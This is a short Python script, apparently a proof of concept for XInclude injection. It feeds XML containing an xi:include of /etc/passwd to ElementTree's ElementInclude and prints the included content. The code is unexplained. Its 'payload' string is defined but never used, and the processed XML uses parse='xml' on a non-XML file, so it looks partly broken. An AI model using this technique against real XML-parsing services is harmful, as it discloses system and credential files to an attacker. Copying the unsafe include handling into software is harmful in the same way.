from xml.etree import ElementTree, ElementInclude

xml = """
<document xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="/etc/passwd" parse="xml" />
</document>
"""
payload = """
<root>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="/etc/passwd" parse="text" />
</foo>
</root>
"""
xpath = '*'

res = ''
root = ElementTree.fromstring(xml.strip())
print(root)
ElementInclude.include(root)
for elem in root.findall(xpath):
    if elem.text != "":
        res += elem.text + ", "

print(res[:-2])